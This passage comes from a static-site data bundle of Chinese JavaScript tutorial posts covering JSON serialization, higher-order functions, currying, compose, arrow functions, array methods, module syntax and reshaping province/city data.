3 4 5 6 7 8 过滤器为数组：JSON.stingify() 的结果只包含数组中列出的属性。 \n var  book  =   { \n            title :   "Professional JavaScript" , \n            authors :   [ "Nicholas C. Zakas" ] , \n            edition :   3 , \n            year :   2011 \n            } ; \n \n var  jsonText  =   JSON . stringify ( book ,   [ "title" ,   "edition" ] ) ; \n \n 1 2 3 4 5 6 7 8 jsonText的值为 {"title": "Professional JavaScript", "edition": 3} \n 过滤器为函数：函数接收两个参数，键名和值(key, value)。函数体中根据键名处理对应的值。 \n var  book  =   { \n            title :   "Professional JavaScript" , \n            authors :   [ "Nicholas C. Zakas" ] , \n            edition :   3 , \n            year :   2011 \n            } ; \n \n var  jsonText  =   JSON . stringify ( book ,   function ( key ,  value ) { \n     switch ( key ) { \n         case   "authors" : \n             return  value . join ( "," )         \n         case   "year" : \n              return   5000 ;            \n         case   "edition" : \n              return   undefined ; \n         default : \n              return  value ; \n     } \n } ) ; \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 序列化后的 jsonText 值为：{"title": "Professional JavaScript", "authors": "Nicholas C. Zakas", "year": 5000} \n 第三个参数用于控制结果的缩进：\n参数为数值 ----- 表示缩进的空格数。 \n var  book  =   { \n            title :   "Professional JavaScript" , \n            authors :   [ "Nicholas C. Zakas" ] , \n            edition :   3 , \n            year :   2011 \n            } ; \n \n var  jsonText  =   JSON . stringify ( book ,   null ,   4 ) ; \njsonText 中的字符串：\n { \n     "title" :   "Professional JavaScript" , \n     "authors" :   [ \n         "Nicholas C. Zakas" \n     ] , \n     "edition" :   3 , \n     "year" :   2011 \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 参数为字符串 ----- 表示使用该字符串进行缩进。 \n var  book  =   { \n            title :   "Professional JavaScript" , \n            authors :   [ "Nicholas C. Zakas" ] , \n            edition :   3 , \n            year :   2011 \n            } ; \n \n var  jsonText  =   JSON . stringify ( book ,   null ,   " - -" ) ; \njsonText 中的字符串：\n { \n -- "title" :   "Professional JavaScript" , \n -- "authors" :   [ \n -- -- "Nicholas C. Zakas" \n -- ] , \n -- "edition" :   3 , \n -- "year" :   2011 \n } \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 （还可以为对象定义 toJSON() 方法，实现对其进行自定义序列化的需求。） \n 三、JSON对象解析为 JavaScript 对象 \n JSON.parse(json对象 [, 还原函数])\n还原参数接收两个参数，键和值。如果返回undefined，则表示从结果中删除相应的键；如果返回其他值，则将该值插入到结果中。 \n var  book  =   { \n            title :   "Professional JavaScript" , \n            authors :   [ "Nicholas C. Zakas" ] , \n            edition :   3 , \n            year :   2011 , \n            releaseDate :   new   Date ( 2011 ,   11 ,   1 ) \n            } ; \n \n var  jsonText  =   JSON . stringify ( book ) ;         \n var  bookCopy  =   JSON . parse ( jsonText ,   function ( key ,  value ) { \n     if   ( key  ==   "releaseDate" ) { \n         return   new   Date ( value ) ; \n     }   else   { \n         return  value ; \n     } \n } ) ; \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 '},{title:"JavaScript 高阶函数",frontmatter:{title:"JavaScript 高阶函数",date:"2021-04-11T16:48:13.000Z",tags:["JavaScript"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/javascript/javascript-gao-jie-han-shu.html",relativePath:"blogs/javascript/javascript-gao-jie-han-shu.md",key:"v-5039faf5",path:"/blogs/javascript/javascript-gao-jie-han-shu.html",headers:[{level:2,title:"Function Object",slug:"function-object"},{level:2,title:"high order function",slug:"high-order-function"},{level:3,title:"Function 参数",slug:"function-参数"},{level:3,title:"Fucntion 返回值",slug:"fucntion-返回值"},{level:2,title:"函数柯里化",slug:"函数柯里化"},{level:2,title:"compose",slug:"compose"},{level:2,title:"小结",slug:"小结"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" 最近在学习函数式编程，整个 team 都在吭一本叫 《Mostly adequate guide》 的编程教材，难度确实挺大的，不过新意满满。今天就讲讲 FP 基础中的基础——高阶函数。 \n Function Object \n 什么是函数？在大多数编程语言中，函数是一段独立的代码块，用来抽象处理某些通用功能的方法；主要操作是给函数传入特定对象（参数），并在方法调用结束后获得一个新的对象（返回值）。 \n function   greeting ( name )   { \n   return   ` Hello  ${ name } ` ; \n } \n\nconsole . log (   greeting ( 'Onion' )   ) ;   // Hello Onion \n \n 1 2 3 4 5 但是在 Javascript、Haskell、Clojure 这类语言中，函数是另一种更高级的存在，俗称一等公民；它除了是代码块以外，它还是一种特殊类型的对象——Function Object。 \n 为什么说 Fuction 也是对象呢？还是看上面的示例函数—— greeting ，我们事实上是可以打印出它的固有属性（properties）的： \n console . log ( greeting . length ,  greeting . name ) ;    // 1 'greeting' \n \n 1 这里 length 是参数列表长度， name 就是它定义的名字了。是不是和对象很接近了？我们甚至可以给它添加新的属性和方法： \n greeting . displayName  =   'Garlic' ; \ngreeting . innerName   =   ( )   =>   'Ginger' ; \n\nconsole . log ( greeting . displayName ) ;   // Garlic \nconsole . log ( greeting . innerName ( ) ) ;   // Ginger \n \n 1 2 3 4 5 是吧？这么看，函数已经包含了几乎所有的 Object 功能了。当然，生产中尽量不要给函数添加随机属性，毕竟代码是给人阅读的，不要随便增加团队的认知成本。 \n high order function \n 上面提到了函数是一种特殊的对象，因此在 js 语言中，函数事实上也可以像普通 object 一样成为其他函数里的参数或是返回值。我们将参数或是范围值为函数的函数称为 高阶函数 。 \n \n Higher-Order function is a function that receives a function as an argument or returns the function as output \n Function 参数 \n 我们先看一下函数如何成为参数，最经典的案例就是 Array#map。给了例子，实现一个让数组所有元素+1 的操作，传统的做法如下所示： \n const  arr1  =   [ 1 ,   2 ,   3 ] ; \n const  arr2  =   [ ] ; \n\n for ( let  i  =   0 ;  i  <  arr1 . length ;  i ++ )   { \n  arr2 . push ( ++ arr1 [ i ] ) ; \n } \nconsole . log ( arr2 ) \n \n 1 2 3 4 5 6 7 如果使用高阶函数 map： \n const  arr1  =   [ 1 ,   2 ,   3 ] ; \n\n const  arr3  =  arr1 . map (   function   callback ( element ,  index ,  array )   { \n   return  element + 1 ; \n } ) ; \n\nconsole . log ( arr3 ) ;   // [2, 3, 4] \n \n 1 2 3 4 5 6 7 map 是 Array.prototype 的原生方法，它的第一个参数是一个 callback 函数，第二个参数是用来绑定 callback 的 this。这里，callback 的作用是迭代调用数组里的元素，并将返回值组装成一个新的数组。这个 map 的 函数参数 本身还有三个参数：element，index 和 array，分别表示迭代时的元素，索引，以及原始数组。 \n 上面的代码使用 es6 的箭头函数，可以写得更简洁一点： \n const  arr1  =   [ 1 ,   2 ,   3 ] ; \n\n const  arr3  =  arr1 . map ( e   =>  e + 1 ) ; \n\nconsole . log ( arr3 ) ;   // [2, 3, 4] \n \n 1 2 3 4 5 讲真，我们经常用到高阶函数，Array 里还有好多类似的函数，如 fliter、reduce 等等。这类高阶函数可以明显的改善代码质量，并切能确保不会对原始数组产生副作用。 \n Fucntion 返回值 \n 返回值是函数的函数，我们也经常使用，最著名的就是 Function#bind。 \n 给个案例，如下函数 greeting 会打印出 this 的 name ，但是 greeting 并不是一个纯函数，因为它的 this 绑定不明确，可能会在不同的运行上下文中会返回不同的结果。 \n function   greeting ( )   { \n   return   ` Hello  ${ this . name } ` ; \n } \n \n 1 2 3 如果想明确它的结果该怎么办呢？嗯，为 greeting 绑定一个 object。这个 helloOnion 就是 greeting.bind 后返回的新函数。 \n let  helloOnoin  =   greeting . bind ( { name :   'Onion' } ) ; \n\nconsole . log ( helloOnoin ( ) ) ;   // Hello Onion \n \n 1 2 3 bind 方法创建一个新的函数，在 bind 被调用时，这个新函数的 this 被 bind 的第一个参数指定，其余的参数将作为新函数的参数供调用时使用。我们可以试着写一个乞丐版的 myBind 方法（bind 还能绑定参数，这个先略过了），这样可以更清晰地看到什么是返回函数的高阶函数了。 \n Function . prototype . myBind   =   function ( context )   { \n   let  func  =   this ;   // method is attached to the prototype, so just refer to it as this. \n   return   function   newFn ( )   { \n     return   func . apply ( context ,  arguments ) ; \n   } \n } \n \n 1 2 3 4 5 6 这里给 Function 的原型链加了一个新的函数 myBind，并用到了闭包（在内存里保留了原始函数和目标 this ）；之后，调用 myBind 返回一个新的函数，并且在该函数运行时调用原始函数，左后通过 apply 执行时绑定目标 this。看一下效果： \n let  helloOnoin  =  greeting . myBind ( { name :   'Onion' } ) ; \n\nconsole . log ( helloOnoin ( ) ) ;   // Hello Onoin \n \n 1 2 3 我这里再写一个健壮一点的 bind 实现，大家自己体会一下，bind 是如何将前几个参数也绑定了的： \n Function . prototype . bind   =   function ( context ,   ... args )   { \n   let  func  =   this ; \n   return   function   ( )   { \n     return   func . call ( context ,   ... args ,   ... arguments ) ; \n   } \n } \n \n 1 2 3 4 5 6 #  函数柯里化 \n 高阶函数还在一种叫 柯里化 的方法里大显身手。 \n \n 在数学和计算机科学中，柯里化是一种将使用多个参数的函数转换成一系列使用一个参数的函数，并且返回接受余下的参数而且返回结果的新函数的技术。 \n \n 柯里化 ，通俗点说就是先给原始函数传入几个参数，它会生成一个新的函数，然后让新的函数去处理接下来的参数。我们先不去管 curry 的实现，看看柯里函数的用法。比如，实现一个 add 函数——简单的两数相加，正常的运行就是直接加两参数运行——add(1,2)。但是这里我们先给它做个柯里化处理，并产生了一个新的函数——curryingAdd。 \n function   curry ( fn )   {   ...   } \n\n function   add ( a ,  b )   {   return  a + b ;   } \n\n const  curryingAdd  =   curry ( add ) ; \n \n 1 2 3 4 5 柯里化后的 curryingAdd，从普通函数变成了高阶函数：它支持一次传入一个参数（比如 10）并返回一个新的函数——addTen。我们运行 addTen(1) ，它会记录之前已经传入的 10，并把 10 和 1 相加得到 11。是不是觉得很 没用 ？哈哈，这说明你 FP 学的不够深。 \n const  addTen  =   curryAdd ( 10 ) ; \n\nconsole . log ( addTen ( 1 ) ) ;   // 11 \nconsole . log ( addTen ( 100 ) ) ;   // 110 \n\n \n 1 2 3 4 5 柯里化的作用就是将普通函数转变成高阶函数，实现动态创建函数、延迟计算、参数复用等等作用。篇幅有限，我不做深入讲解了。它实现上，就是返回一个高阶函数，通过闭包把传入的参数保存起来。当传入的参数数量不足时，递归调用 bind 方法；数量足够时则立即执行函数。学习一下 javascript 的高阶用法还是有意义的。 \n function   curry ( fn )   { \n   const  arity  =  fn . length ; \n\n   return   function   $curry ( ... args )   { \n     if (  args . length  <  arity  )   { \n       return   $curry . bind ( null ,   ... args ) ; \n     } \n     return   fn . apply ( null ,  args ) ; \n   } \n } \n \n 1 2 3 4 5 6 7 8 9 10 #  compose \n compose 也是一个高阶函数里重要的一课。compose 就是组合函数，将子函数串联起来执行，一个函数的输出结果是另一个函数的输入参数，一旦第一个函数开始执行，会像多米诺骨牌一样推导执行后续函数。还是举个例子：我实现了一个带 Hello 的 greeting 函数，并希望在 greeting 调用结束后把返回值都显示成大写状态。 \n const   greeting   =   name   =>   ` Hello  ${ name } ` ; \n const   toUpper   =   str   =>  str . toUpperCase ( ) ; \n\n toUpper ( greeting ( 'Onion' ) ) ;   // HELLO ONION \n \n 1 2 3 4 传统的手段就是嵌套两个函数使用—— toUpper(greeting('Onion')) ，但是有时候这种嵌套可能会很多，比如下面这个态势： \n f ( g ( h ( i ( j ( k ( 'Onion' ) ) ) ) ) ) \n \n 1 再看看 compose 的用法： \n const  composedFn  =   compose ( f ,  g ,  h ,  i ,  j ,  k ) \nconsole . log (   composedFn ( 'Onion' )   ) \n \n 1 2 是不是这一个 composedFn 函数比那种一层层的嵌套要美观的多？OK，怎么实现 compose 函数呢？把源码贴在这里了。如果你觉得写 (...fns) => (...args) => .. 这类代码不可思议的话，建议吭一下上面提到的教程 《Mostly adequate guide》 ，吭完你就发现再正常不过了。 \n // compose: ( (a->b), (b->c), ..., (y->z) ) -> a -> z \n const   compose   =   ( ... fns )   =>   ( ... args )   =>  fns . reduceRight ( ( res ,  fn )   =>   [ fn . apply ( null ,  res ) ] ,  args ) [ 0 ] ; \n \n 1 2 #  小结 \n 这一期快速科普了 JS 高阶函数，现实开发中很多人都觉得没啥用，但是面试官很喜欢问这类问题。倒不是说面试官懂很多，大概率他也只是看题库问问题罢了。我是觉得学习这类方法的意义还是在于思维训练——为 FP 编程打好基础。OK，努力成为一个更优秀的开发人员吧。 \n"},{title:"JavaScript 箭头函数（Lambda表达式）",frontmatter:{title:"JavaScript 箭头函数（Lambda表达式）",date:"2021-03-02T18:36:43.000Z",tags:["JavaScript"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/javascript/javascript-jian-tou-han-shu-lambda-biao-da-shi.html",relativePath:"blogs/javascript/javascript-jian-tou-han-shu-lambda-biao-da-shi.md",key:"v-0712dd96",path:"/blogs/javascript/javascript-jian-tou-han-shu-lambda-biao-da-shi.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' \n \n Lambda表达式(箭头函数)用于表示一个函数，所以它和函数一样，也拥有参数、返回值、函数体，但它没有函数名，所以Lambda表达式相当于一个匿名函数。 \n \n \n 使用方法 \n \n \n ()=>{}\n \n 1 小括号里放参数，大括号里放函数体 \n \n 箭头函数做回调参数 \n \n [ 5 ,   8 ,   9 ] . map ( item   =>  item  +   1 ) ; // -> [6, 9, 10] \n \n 1 \n 当箭头函数有一个参数时，参数两边的括号是可有可无的 \n \n const   foo   =   bar   =>  bar  +   1 ; \n const   bar   =   ( baz )   =>  baz  +   1 ; \n \n 1 2 \n 箭头函数不带参数时，必须要用括号 \n \n const   foo   =   ( )   =>   "foo" ; \n \n 1 \n 如果函数体不是只一行，应该用花括号，并显式地返回（如果需要返回值） \n \n const   foo   =   bar   =>   { \n const  baz  =   5 ; \n return  bar  +  baz ; \n } ; \n foo ( 1 ) ;   // -> 6 \n \n 1 2 3 4 5 '},{title:"JavaScript 判断字符串是不是为空",frontmatter:{title:"JavaScript 判断字符串是不是为空",date:"2021-03-03T15:20:47.000Z",tags:["JavaScript"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/javascript/javascript-pan-duan-zi-fu-chuan-shi-bu-shi-wei-kong.html",relativePath:"blogs/javascript/javascript-pan-duan-zi-fu-chuan-shi-bu-shi-wei-kong.md",key:"v-767f87d6",path:"/blogs/javascript/javascript-pan-duan-zi-fu-chuan-shi-bu-shi-wei-kong.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' 判断字符串是否为空，代码如下： \n var  test = "" ; \n if ( ! test ) { \n     alert ( "为空" ) ; \n } \n\n if ( ! ! test ) { \n     alert ( "不为空" ) ; \n } \n \n 1 2 3 4 5 6 7 8 '},{title:"JavaScript 数组转字符串",frontmatter:{title:"JavaScript 数组转字符串",date:"2021-03-03T16:04:45.000Z",tags:["JavaScript"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/javascript/javascript-shu-zu-zhuan-zi-fu-chuan.html",relativePath:"blogs/javascript/javascript-shu-zu-zhuan-zi-fu-chuan.md",key:"v-2f069e4b",path:"/blogs/javascript/javascript-shu-zu-zhuan-zi-fu-chuan.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" JavaScript 允许数组与字符串之间相互转换。其中 Array 方法对象定义了 3 个方法，可以把数组转换为字符串，如表所示\n|数组方法|\t说明|\n|toString()|\t将数组转换成一个字符串|\n|toLocalString()|\t把数组转换成本地约定的字符串|\n|join()|\t将数组元素连接起来以构建一个字符串| \n"},{title:"JavaScript 中 map()、forEach()、reduce()、filter()、some()、every、lastIndexOf()、indexOf()的区别",frontmatter:{title:"JavaScript 中 map()、forEach()、reduce()、filter()、some()、every、lastIndexOf()、indexOf()的区别",date:"2021-05-10T16:50:39.000Z",tags:["JavaScript","map","forEach","reduce","filter"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/javascript/javascript-zhong-mapforeachreducefilterde-qu-bie.html",relativePath:"blogs/javascript/javascript-zhong-mapforeachreducefilterde-qu-bie.md",key:"v-9b7065d6",path:"/blogs/javascript/javascript-zhong-mapforeachreducefilterde-qu-bie.html",headers:[{level:2,title:"相同点：",slug:"相同点"},{level:2,title:"不同点：",slug:"不同点"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" map() \n map()方法按照原始数组元素顺序依次处理元素，返回一个新的数组，数组中的元素为原始数组调用函数处理后的值。可看作是对原数组进行映射。 \n 注意：map()方法不会对空数组进行检测。 \n array . map ( function ( currentValue , index , arr ) ,  thisValue ) \n //参数：当前元素、当前元素的索引、当前元素所属的数组 \n\n var  wallets  =  people . map ( function   ( dude )   { \n return  dude . wallet ; \n } ) ; \n \n 1 2 3 4 5 6 #  forEach() \n forEach()方法用于遍历数组的每个元素，将元素传给回调函数。 \n 注意：forEach()对于空数组是不会调用回调函数的。 \n array . forEach ( function ( currentValue ,  index ,  arr ) ,  thisValue ) \n //参数：当前元素、当前元素的索引、当前元素所属的数组 \n\npeople . forEach ( function   ( dude )   { \ndude . pickUpSoap ( ) ; \n } ) ; \n \n 1 2 3 4 5 6 #  reduce() \n reduce()方法是让数组中的前项和后项做某种计算，并累计最终值。 \n array . reduce ( function ( total ,  currentValue ,  currentIndex ,  arr ) ,  initialValue ) 初始值\n //参数：初始值(计算结束的返回值)、当前元素、当前元素的索引、当前元素所属的数组 \n\n var  totalMoney  =  wallets . reduce ( function   ( countedMoney ,  wallet )   { \n return  countedMoney  +  wallet . money ; \n } ,   0 ) ; \n \n 1 2 3 4 5 6 #  filter() \n filter()方法会筛选出数组中符合条件的项，组成一个新数组。 \n array . filter ( function ( currentValue , index , arr ) ,  thisValue ) \n //参数：当前元素、当前元素的索引、当前元素所属的数组 \n\n var  fatWallets  =  wallets . filter ( function   ( wallet )   { \n return  wallet . money  >   100 ; \n } ) ; \n \n 1 2 3 4 5 6 #  some() \n 对数组中的每个元素都执行一次指定的函数（callback），直到此函数返回 true，如果发现这个元素，some 将返回 true，如果回调函数对每个元素执行后都返回 false ，some 将返回 false。它只对数组中的非空元素执行指定的函数，没有赋值或者已经删除的元素将被忽略。 \n //检查是否有数组元素大于等于10： \n\n function   isBigEnough ( element ,  index ,  array )   { \n     return   ( element  >=   10 ) ; \n } \n var  passed  =   [ 2 ,   5 ,   8 ,   1 ,   4 ] . some ( isBigEnough ) ; \n // passed is false \npassed  =   [ 12 ,   5 ,   8 ,   1 ,   4 ] . some ( isBigEnough ) ; \n // passed is true \n //结果： \n //[2, 5, 8, 1, 4].some(isBigEnough) ： false  \n //[12, 5, 8, 1, 4].some(isBigEnough) ： true \n \n 1 2 3 4 5 6 7 8 9 10 11 12 #  every() \n 对数组中的每个元素都执行一次指定的函数（callback），直到此函数返回 false，如果发现这个元素，every 将返回 false，如果回调函数对每个元素执行后都返回 true ，every 将返回 true。它只对数组中的非空元素执行指定的函数，没有赋值或者已经删除的元素将被忽略 \n //测试是否所有数组元素都大于等于10： \n\n function   isBigEnough ( element ,  index ,  array )   { \n     return   ( element  >=   10 ) ; \n } \n var  passed  =   [ 12 ,   5 ,   8 ,   130 ,   44 ] . every ( isBigEnough ) ; \n // passed is false \npassed  =   [ 12 ,   54 ,   18 ,   130 ,   44 ] . every ( isBigEnough ) ; \n // passed is true \n //结果： \n //[12, 5, 8, 130, 44].every(isBigEnough) 返回 ： false  \n //[12, 54, 18, 130, 44].every(isBigEnough) 返回 ： true \n \n 1 2 3 4 5 6 7 8 9 10 11 12 #  lastIndexOf() \n 语法 \n var  index  =  array . lastIndexOf ( searchElement [ ,  fromIndex ] ) ; \n \n 1 参数说明\nsearchElement： 要搜索的元素\nfromIndex ： 开始搜索的位置，默认为数组的长度（length），在这样的情况下，将搜索所有的数组元素。搜索是反方向进行的。\n功能说明\n比较 searchElement 和数组的每个元素是否绝对一致（===），当有元素符合条件时，返回当前元素的索引。如果没有发现，就直接返回 -1 。 \n //查找符合条件的元素： \n var  array  =   [ 2 ,   5 ,   9 ,   2 ] ; \n var  index  =  array . lastIndexOf ( 2 ) ; \n // index is 3 \nindex  =  array . lastIndexOf ( 7 ) ; \n // index is -1 \nindex  =  array . lastIndexOf ( 2 ,   3 ) ; \n // index is 3 \nindex  =  array . lastIndexOf ( 2 ,   2 ) ; \n // index is 0 \nindex  =  array . lastIndexOf ( 2 ,   - 2 ) ; \n // index is 0 \nindex  =  array . lastIndexOf ( 2 ,   - 1 ) ; \n // index is 3 \n //结果： \n //[2, 5, 9, 2].lastIndexOf(2) ： 3  \n //[2, 5, 9, 2].lastIndexOf(7) ： -1  \n //[2, 5, 9, 2].lastIndexOf(2, 3) ： 3  \n //[2, 5, 9, 2].lastIndexOf(2, 2) ： 0  \n //[2, 5, 9, 2].lastIndexOf(2, -2) ： 0  \n //[2, 5, 9, 2].lastIndexOf(2, -1) ： 3 \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 #  indexOf(): \n 功能与lastIndexOf()一样，搜索是正向进行的 \n //查找符合条件的元素： \n\n var  array  =   [ 2 ,   5 ,   9 ] ; \n var  index  =  array . indexOf ( 2 ) ; \n // index is 0 \nindex  =  array . indexOf ( 7 ) ; \n // index is -1 \n //结果： \n //[2, 5, 9].indexOf(2) ： 0  \n //[2, 5, 9].indexOf(7) ： -1 \n \n 1 2 3 4 5 6 7 8 9 10 #  总结 \n 相同点： \n 都会循环遍历数组中的每一项； \n \n map()、forEach()和filter()方法里每次执行匿名函数都支持3个参数，参数分别是：当前元素、当 前元素的索引、当前元素所属的数组； \n 匿名函数中的this都是指向window； \n 只能遍历数组。 \n 不同点： \n \n map()速度比forEach()快； \n map()和filter()会返回一个新数组，不对原数组产生影响；forEach()不会产生新数组，返回 undefined；reduce()函数是把数组缩减为一个值(比如求和、求积)； \n map()里可以用return，而forEach()里用return不起作用，forEach()不能用break，会直接报错； \n reduce()有4个参数，第一个参数为初始值。 \n \n"},{title:"JavaScript 中 require 和 import 的区别",frontmatter:{title:"JavaScript 中 require 和 import 的区别",date:"2021-05-10T17:53:00.000Z",tags:[],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/javascript/javascript-zhong-require-he-import-de-qu-bie.html",relativePath:"blogs/javascript/javascript-zhong-require-he-import-de-qu-bie.md",key:"v-47687595",path:"/blogs/javascript/javascript-zhong-require-he-import-de-qu-bie.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 遵循的模块化规范不一样 \n require/exports 出生在野生规范当中，什么叫做野生规范？即这些规范是 JavaScript 社区中的开发者自己草拟的规则，得到了大家的承认或者广泛的应用。比如 CommonJS、AMD、CMD 等等。import/export 则是名门正派。TC39 制定的新的 ECMAScript 版本，即 ES6（ES2015）中包含进来。 \n 出现的时间不同 \n require/exports 相关的规范由于野生性质，在 2010 年前后出生。AMD、CMD 相对命比较短，到 2014 年基本上就摇摇欲坠了。一开始大家还比较喜欢在浏览器上采用这种异步小模块的加载方式，但并不是银弹。随着 Node.js 流行和 Browsersify 的兴起，运行时异步加载逐渐被构建时模块合并分块所替代。Wrapper 函数再也不需要了。 2014 年 Webpack 还是新玩意，现在已经是前端必备神器了。 \n \n Browsersify、Webpack 一开始的目的就是打包 CommonJS 模块。 \n \n CommonJS 作为 Node.js 的规范，一直沿用至今。由于 npm 上 CommonJS 的类库众多，以及 CommonJS 和 ES6 之间的差异，Node.js 无法直接兼容 ES6。所以现阶段 require/exports 任然是必要且实必须的。出自 ES6 的  import/export 相对就晚了许多。被大家所熟知和使用也是 2015 年之后的事了。 这其实要感谢 babel（原来项目名叫做 6to5，后更名为 babel） 这个神一般的项目。由于有了 babel 将还未被宿主环境（各浏览器、Node.js）直接支持的 ES6 Module 编译为 ES5 的 CommonJS —— 也就是 require/exports 这种写法 —— Webpack 插上 babel-loader 这个翅膀才开始高飞，大家也才可以称 \" 我在使用 ES6！ \" \n \n 这也就是为什么前面说 require/exports 是必要且必须的。因为事实是，目前你编写的 import/export 最终都是编译为 require/exports 来执行的。 \n require/exports 和 import/export 形式不一样 \n require/exports 的用法只有以下三种简单的写法： \n const  fs  =   require ( 'fs' ) \nexports . fs  =  fs\nmodule . exports  =  fs\n \n 1 2 3 而 import/export 的写法就多种多样： \n import  fs  from   'fs' \n import   { default   as  fs }   from   'fs' \n import   *   as  fs  from   'fs' \n import   { readFile }   from   'fs' \n import   { readFile  as  read }   from   'fs' \n import  fs ,   { readFile }   from   'fs' \n\n export   default  fs\n export   const  fs\n export   function  readFile\n export   { readFile ,  read } \n export   *   from   'fs' \n \n 1 2 3 4 5 6 7 8 9 10 11 12 #  require/exports 和 import/export 本质上的差别 \n 形式上看起来五花八门，但本质上： \n \n CommonJS 还是 ES6 Module 输出都可以看成是一个具备多个属性或者方法的对象； \n default 是 ES6 Module 所独有的关键字，export default fs 输出默认的接口对象，import fs from 'fs' 可直接导入这个对象； \n ES6 Module 中导入模块的属性或者方法是强绑定的，包括基础类型；而 CommonJS 则是普通的值传递或者引用传递。 \n \n"},{title:"做省市区联动时，将数据调整到合适结构的两种常用方法",frontmatter:{title:"做省市区联动时，将数据调整到合适结构的两种常用方法",date:"2021-05-10T17:18:49.000Z",tags:["JavaScript","解构"],categories:"front-end-js",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/javascript/javascript-zhong-shu-zu-zhuan-huan-cheng-zhi-ding-mo-ban.html",relativePath:"blogs/javascript/javascript-zhong-shu-zu-zhuan-huan-cheng-zhi-ding-mo-ban.md",key:"v-24b2e796",path:"/blogs/javascript/javascript-zhong-shu-zu-zhuan-huan-cheng-zhi-ding-mo-ban.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' 进行省市县三级联动的时候，需要把数据转换成指定类型的对象。\n就需要对对象的解构。 \n 起因 \n 省市区联动，或者城市名称匹配，是很常用的功能。在实现他们的时候，经常会出现这样的情况：拿到的行政区划数据 和 渲染所需要的结构 不相符。通常我会用JS把它们处理成合适的结构。 \n 核心思路 \n 遍历其子元素或属性，在遍历的回调函数中，通过临时对象，将数据重新组织成需要的结构，再将其push进一个新构建的数组中。遍历完成后，该数组就是想要的最后结果。 \n 两种套路：数组 VS 对象。 \n 对于数组和对象，有不同的遍历方式。 \n \n \n 对于数组，视情况可用map(), forEach()，filter()等方法； \n \n \n 对于对象，可以结合使用for in与 Object.keys() 来遍历其属性。 \n \n \n \n 注：Object.keys()可以返回一个由一个给定对象的自身可枚举属性组成的数组，数组中属性名的排列顺序和使用 for…in 循环遍历该对象时返回的顺序一致 （两者的主要区别是 一个 for-in 循环还会枚举其原型链上的属性）。 \n 例子 \n 1、数组 \n 有组数据 \n var  data1  =   [ { "provinceCode" : "33" , "provinceName" : "浙江省" , "cityCode" : "3301" , "cityName" : "杭州市" } , { "provinceCode" : "33" , "provinceName" : "浙江省" , "cityCode" : "3302" , "cityName" : "宁波市" } , { "provinceCode" : "33" , "provinceName" : "浙江省" , "cityCode" : "3303" , "cityName" : "温州市" } ] ; \n \n 1 需要转换成 {provinceCode:"",provinceName:"",children:[]} 这种类型的模版。具体实现如下 \n function   formatdata ( data )   { \n\t var  data  =   [ ... data ] \n      // 对象模版 \n\t var  city  =   { \n\t\tprovinceCode :   "" , \n\t\tprovinceName :   "" , \n\t\tchildren :   [ ] \n\t } ; \n\tcity . provinceCode  =  data [ 0 ] . provinceCode ; \n\tcity . provinceName  =  data [ 0 ] . provinceName ; \n\t // 方法一 \n\t // var children = []; \n\t // data.forEach(i = >{ \n\t // \tvar { \n\t // \t\tcityCode: cityCode, \n\t // \t\tcityName: cityName \n\t // \t} = i; \n\t // \tchildren.push({ \n\t // \t\tcityCode: cityCode, \n\t // \t\tcityName: cityName \n\t // \t}); \n\t // }) city.children = children; \n\t // 方法二：\t \n\tcity . children  =  data1 . map ( i   => { \n\t\t var   { \n\t\t\tcityCode :  cityCode , \n\t\t\tcityName :  cityName\n\t\t }   =  i ; \n\t\t return   { \n\t\t\tcityCode :  cityCode , \n\t\t\tcityName :  cityName\n\t\t } ; \n\t } ) ; \n\t var  city_json  =   JSON . stringify ( city ) ;   // 对像转换成json  \n\t var  city2  =   JSON . parse ( city_json ,   ( key ,  value )   => { \n\t\t return  value\n\t } ) ;   // json 转换成对象 \n\tconsole . log ( city_json ) ; \n\tconsole . log ( city2 ) ; \n } \n formatdata ( data1 ) \n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 #  2、对象 \n const  fs  =   require ( \'fs\' ) \n const  rawData  =   { \n   "北京市" : { \n     "市辖区" : [ "东城区" , "西城区" , "朝阳区" , "丰台区" , "石景山区" , "海淀区" , "门头沟区" , "房山区" , "通州区" , "顺义区" , "昌平区" , "大兴区" , "怀柔区" , "平谷区" , "密云区" , "延庆区" ] \n   } , \n   "天津市" : { \n     "市辖区" : [ "和平区" , "河东区" , "河西区" , "南开区" , "河北区" , "红桥区" , "东丽区" , "西青区" , "津南区" , "北辰区" , "武清区" , "宝坻区" , "滨海新区" , "宁河区" , "静海区" , "蓟州区" ] \n   } \n } \n //目标结构 \n // const options = [{ \n //   value: \'浙江\', \n //   label: \'浙江\', \n //   children: [{ \n //     value: \'hangzhou\', \n //     label: \'Hangzhou\', \n //     children: [{ \n //       value: \'xihu\', \n //       label: \'West Lake\', \n //     }], \n // \n //   }] \n // }]; \n const  finalArr  =   [ ] \n for   ( let  prop  of  Object . keys ( rawData ) ) { \n       let  tempObj  =   { } \n      tempObj . label  =  prop\n      tempObj . value  =  prop\n      tempObj . children  =   [ ] \n\n       for   ( let  pr  of  Object . keys ( rawData [ prop ] ) ) { \n         let  tempTempObj  =   { } \n        tempTempObj . label  =  pr\n        tempTempObj . value  =  pr\n\n         let  tempTempArr  =   